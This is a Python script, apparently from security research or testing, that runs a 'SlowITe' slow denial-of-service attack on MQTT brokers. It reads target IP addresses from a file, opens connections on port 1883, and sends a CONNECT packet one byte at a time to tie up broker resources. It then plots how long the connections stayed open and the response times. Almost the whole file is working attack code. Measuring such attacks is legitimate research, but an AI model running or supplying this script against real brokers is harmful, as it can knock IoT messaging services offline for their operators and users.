import socket
import time
import matplotlib.pyplot as plt

# MQTT Server Configuration
BROKER_PORT = 1883
NUM_CONNECTIONS = 2
DELAY = 10
ATTACK_DURATION = 100

MQTT_CONNECT_PACKET = bytes([
    0x10, 0x1E,
    0x00, 0x04,
    ord('M'), ord('Q'), ord('T'), ord('T'),
    0x04,
    0x02,
    0x00, 0x1E,
    0x00, 0x06,
    ord('s'), ord('l'), ord('o'), ord('w'), ord('i'), ord('d')
])

connection_durations = []  # Track how long each connection remains open
response_times = []        # Store response times for sent bytes


def send_slow_mqtt(broker_ip):
    print(f"[+] Starting SlowITe attack on {broker_ip}:{BROKER_PORT} for {ATTACK_DURATION} seconds")

    try:
        # Track open connections and timestamps
        sockets = []
        timestamps = []

        # Establish connections and send initial 10 bytes
        for i in range(NUM_CONNECTIONS):
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((broker_ip, BROKER_PORT))
                sockets.append(s)
                s.send(MQTT_CONNECT_PACKET[:10])  # Send the initial 10 bytes
                timestamps.append((time.time(), 10))  # Track byte sent timestamps
                print(f"[*] Sent initial 10 bytes of CONNECT packet from client {i} to {broker_ip}")
            except Exception as e:
                print(f"[!] Connection {i} to {broker_ip} failed: {e}")

        start_time = time.time()

        # Continue the attack for the specified duration
        while time.time() - start_time < ATTACK_DURATION:
            time.sleep(DELAY)
            for idx, s in enumerate(sockets):
                try:
                    sent_index = timestamps[idx][1]  # Track which byte to send next

                    # Send remaining bytes of the packet if not yet fully sent
                    if sent_index < len(MQTT_CONNECT_PACKET):
                        s.send(MQTT_CONNECT_PACKET[sent_index:sent_index + 1])
                        timestamps[idx] = (time.time(), sent_index + 1)
                        print(f"[+] Sent byte {sent_index} to broker {broker_ip}.")
                    else:
                        # After full packet is sent, keep the connection open and send 1 byte periodically
                        s.send(b'X')  # Send 1 byte periodically to keep the connection alive
                        print(f"[+] Sent 1 byte to keep connection {idx} alive with {broker_ip}.")
                        timestamps[idx] = (time.time(), sent_index)

                except Exception as e:
                    print(f"[!] Error sending on connection {idx}: {e}")
                    s.close()
                    duration = time.time() - start_time
                    connection_durations.append(duration)
                    response_times.extend([time.time() - ts[0] for ts in timestamps])

        # Track when connections are closed after attack duration
        for s in sockets:
            s.close()

        print(f"[+] All connections to {broker_ip} closed.")

    except Exception as e:
        print(f"[!] Unexpected error with broker {broker_ip}: {e}")


def plot_cumulative_open_times():
    if not connection_durations:
        print("[!] No connection durations recorded. Skipping open times plot.")
    else:
        sorted_durations = sorted(connection_durations)
        cumulative_connections = list(range(1, len(sorted_durations) + 1))

        plt.figure(figsize=(10, 5))
        plt.plot(sorted_durations, cumulative_connections, marker='o', color='blue')
        plt.title("Cumulative Frequency of Open Connections vs Time")
        plt.xlabel("Time (seconds)")
        plt.ylabel("Cumulative Number of Connections")
        plt.grid(True)
        plt.tight_layout()
        plt.savefig("cumulative_open_times_plot.png", format="png", dpi=300)
        print("[+] Plot saved as 'cumulative_open_times_plot.png'.")
        plt.show()


def plot_response_times():
    if not response_times:
        print("[!] No response times recorded. Skipping response times plot.")
    else:
        sorted_responses = sorted(response_times)
        cumulative_responses = list(range(1, len(sorted_responses) + 1))

        plt.figure(figsize=(10, 5))
        plt.plot(sorted_responses, cumulative_responses, marker='o', color='green')
        plt.title("Cumulative Response Time vs Time")
        plt.xlabel("Time (seconds)")
        plt.ylabel("Cumulative Number of Responses")
        plt.grid(True)
        plt.tight_layout()
        plt.savefig("cumulative_response_times_plot.png", format="png", dpi=300)
        print("[+] Response Time Plot saved as 'cumulative_response_times_plot.png'.")
        plt.show()


def main():
    try:
        with open("ip.txt", "r") as file:
            ip_addresses = [line.strip() for line in file if line.strip()]

        if not ip_addresses:
            print("[!] No IP addresses found in ip.txt. Exiting.")
            return

        for broker_ip in ip_addresses:
            send_slow_mqtt(broker_ip)

        # Plot the graphs after processing all IPs
        plot_cumulative_open_times()
        plot_response_times()

    except FileNotFoundError:
        print("[!] ip.txt file not found. Please create the file and add broker IP addresses.")
    except Exception as e:
        print(f"[!] Unexpected error: {e}")


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[!] Attack stopped by user.")
